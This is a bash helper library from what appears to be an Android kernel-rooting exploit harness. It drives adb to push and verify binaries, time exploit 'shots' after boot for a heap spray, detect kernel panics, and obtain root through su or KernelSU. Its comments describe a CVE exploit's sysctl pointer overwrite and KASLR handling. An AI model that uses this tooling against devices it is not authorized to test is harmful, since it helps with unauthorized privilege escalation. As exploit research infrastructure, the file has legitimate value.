# shellcheck shell=bash
#
# adb.sh — adb transport wrappers and device-state primitives.
#
# All device interaction is driven over `adb shell` from the host, so control
# flow and logs stay on the host side. Requires the globals set by the
# entrypoint: SERIAL, DEV_TMP, DEV_SU, DEV_KSU_SU, SETTLE_SECS and RUNLOG.

ADB=(adb)
[ -n "${SERIAL:-}" ] && ADB=(adb -s "$SERIAL")

ash()   { "${ADB[@]}" shell "$@"; }
asu()   { ash "$DEV_SU -c \"$*\""; }                 # run a command as root via temp su
apush() { "${ADB[@]}" push "$1" "$2" 2>&1 | tail -1 | tee_log; }

# Push, then verify by md5: a stale or short on-device binary fails silently, and
# the classifier can only read it as REFUSED. adb push can be a no-op or leave a
# short file (device full, interrupted transfer, a file another run left
# read-only), and none of those fail loudly. The run stops if the copies differ.
apush_verified() {
  local src="$1" dst="$2" want got
  apush "$src" "$dst"
  want="$(md5sum "$src" 2>/dev/null | awk '{print $1}')"
  got="$(ash "md5sum $dst 2>/dev/null" | tr -d '\r' | awk '{print $1}')"
  if [ -z "$want" ] || [ -z "$got" ]; then
    warn "  could not checksum $dst — continuing unverified"
    return 0
  fi
  if [ "$want" != "$got" ]; then
    err "push verification FAILED for $dst"
    err "  host   $want  ($src)"
    err "  device $got"
    err "the device is running different bytes than the host built; refusing to shoot"
    return 1
  fi
  log "  verified $dst ($want)"
  return 0
}
alive() { "${ADB[@]}" get-state >/dev/null 2>&1; }

# Boot identity, for deciding whether a derived KASLR base is still valid.
#
# boot_id is unusable here: the exploit writes through that sysctl entry's .data
# pointer, and the CFI stage normalises it back to sysctl_bootid
# (cves/cve-2026-43499-ghostlock/fops.c:restore_slide_boot_id). Sampled while it
# points elsewhere — or before that write lands — the procfs file returns
# whatever that pointer addresses, not a boot id.
#
# btime is the boot wall-clock second from /proc/stat. Nothing in the exploit
# touches it, and it changes only on a real boot.
boot_epoch() { ash 'grep -m1 btime /proc/stat' | tr -d '\r' | awk '{print $2}'; }
getprop() { ash "getprop $1" | tr -d '\r'; }

# Wait for the device to reappear and finish booting.
wait_boot() {
  timeout 120 "${ADB[@]}" wait-for-device 2>/dev/null || return 1
  local i
  # shellcheck disable=SC2034  # loop counter only
  for i in $(seq 1 120); do
    [ "$(getprop sys.boot_completed)" = "1" ] && return 0
    sleep 1
  done
  return 1
}

# Wait only until the device can actually be shot at, not until Android says it
# has finished booting.
#
# sys.boot_completed lands around 40 s in, and everything after it -- the launcher,
# the app zygotes, the media and network stacks -- is allocator churn competing for
# exactly the order-3 blocks the reclaim spray needs. A reboot setup step fires
# before any of that arrives, so this waits for the transport, an adb shell that
# answers, and a writable /data/local/tmp, and nothing else.
wait_boot_minimal() {
  timeout 120 "${ADB[@]}" wait-for-device 2>/dev/null || return 1
  local i
  for i in $(seq 1 120); do
    # Write a token and read it back: proves the shell answers and /data is
    # mounted writable, which is all a shot needs.
    if [ "$(ash "echo rdy > $DEV_TMP/.ready 2>/dev/null; cat $DEV_TMP/.ready 2>/dev/null; rm -f $DEV_TMP/.ready" 2>/dev/null | tr -d '\r\n')" = "rdy" ]; then
      return 0
    fi
    sleep 1
  done
  return 1
}

# Reboot and come back as early as the device will allow.
reboot_device_fast() {
  log "  rebooting for a fresh boot"
  "${ADB[@]}" reboot >/dev/null 2>&1 || true
  sleep 1
  wait_boot_minimal || { warn "device did not come back"; return 1; }
  SETTLED_BTIME="$(boot_epoch)"   # nothing to settle: firing early is the point
  return 0
}

# Block until the adb connection is lost -- the instant the kernel panics and the
# phone reboots. Detection is not a poll: a device-side `cat` holds the
# connection open and returns only when it drops. Its stdin is a host FIFO we
# keep open but never write to, so the `cat` blocks on the read instead of seeing
# EOF and exiting at once; when the phone goes down adb returns and so does this.
wait_connection_drop() {
  local fifo wfd
  fifo="$(mktemp -u "${TMPDIR:-/tmp}/pkr-wait.XXXXXX")"
  if ! mkfifo "$fifo" 2>/dev/null; then
    warn "  mkfifo failed; polling for the drop instead"
    while alive; do sleep 1; done
    return 0
  fi
  exec {wfd}>"$fifo"                 # open writer: keeps the FIFO from EOF-ing
  "${ADB[@]}" shell cat <"$fifo" >/dev/null 2>&1
  exec {wfd}>&-                      # connection lost: release the FIFO
  rm -f "$fifo"
}

# Wait for the phone to come back after a drop and be minimally usable again.
wait_device_back() {
  timeout 180 "${ADB[@]}" wait-for-device 2>/dev/null || true
  wait_boot_minimal || { warn "device did not come back after the panic"; return 1; }
}

# Convenience for --debug-panic without a trigger recipe: block on the drop, wait
# the device back, then let the caller root this fresh boot in place. The payload
# is already staged; nothing runs between the drop and the root attempt, so the
# pstore record the panic left is still there to read.
wait_for_reboot() {
  log "  armed — trigger the crash now; blocking until the phone drops"
  wait_connection_drop
  log "  connection lost — the phone is rebooting"
  wait_device_back || return 1
  ok "  device back — rooting in place"
}

# Deliberate reboot. Used for the outcomes whose only safe continuation is a
# fresh boot: REFUSED, PARKED and DIRTY. See classify_shot() in
# runner/lib/exploit.sh for what each of those outcomes means.
reboot_device() {
  log "  rebooting device"
  "${ADB[@]}" reboot >/dev/null 2>&1 || true
  sleep 1
  wait_boot || { warn "device did not come back after reboot"; return 1; }
  settle_boot
}

# A shot fired into a boot that has not settled fast-misses or is refused.
# settle_boot is keyed on btime, so it costs SETTLE_SECS once per boot rather
# than once per shot, and nothing at all on a device this run did not reboot.
SETTLED_BTIME=""
settle_boot() {
  local bt now age left
  bt="$(boot_epoch)"
  [ -n "$bt" ] || return 0
  [ "$bt" = "$SETTLED_BTIME" ] && return 0
  # SETTLE_SECS is the uptime a shot should see, not a duration to sleep, so only
  # the shortfall is waited and a device already past it waits nothing. The value
  # is the quiet time the run that rooted in 99s actually gave its shots: it slept
  # 30s on a boot 12s old, so shots fired at ~42s of uptime, rounded up to 45.
  now="$(date +%s)"; age=$(( now - bt )); [ "$age" -lt 0 ] && age=0
  left=$(( ${SETTLE_SECS:-45} - age ))
  if [ "$left" -gt 0 ]; then
    log "  settling ${left}s (boot @$bt, up ${age}s of ${SETTLE_SECS:-45}s)"
    sleep "$left"
  else
    log "  boot @$bt settled (up ${age}s) — no wait"
  fi
  SETTLED_BTIME="$bt"
}

have_root() { asu id 2>/dev/null | strip | grep -q 'uid=0'; }

# Resolve an su on the device that answers as root, or empty. Tries KernelSU's
# su, the debug-ramdisk one, and whatever bare `su` resolves to, retrying for a
# few seconds because a just-loaded KernelSU installs its su slightly after the
# driver comes up. Used by any step that needs root it did not obtain itself --
# a needs_root setup step, and teardown.
root_su() {
  local i su
  for i in $(seq 1 "${1:-1}"); do
    for su in "${DEV_KSU_SU:-/system/bin/su}" /debug_ramdisk/su su; do
      if ash "$su -c id" 2>/dev/null | strip | grep -q 'uid=0'; then
        printf '%s' "$su"; return 0
      fi
    done
    [ "$i" -lt "${1:-1}" ] && sleep 1
  done
  return 1
}

# KernelSU driver version via the get_version syscall. This needs NO root and
# still answers after late-load enforces SELinux and tears down the temp-su
# daemon, so it is the authority on whether the module is resident. Empty or 0
# means not loaded. $1 is the on-device ksud path.
ksu_version() {
  ash "$1 debug version 2>/dev/null" | strip \
    | grep -oE 'Kernel Version:[[:space:]]*[0-9]+' | grep -oE '[0-9]+$'
}
ksu_loaded() { local v; v=$(ksu_version "$1"); [ -n "$v" ] && [ "$v" != 0 ]; }
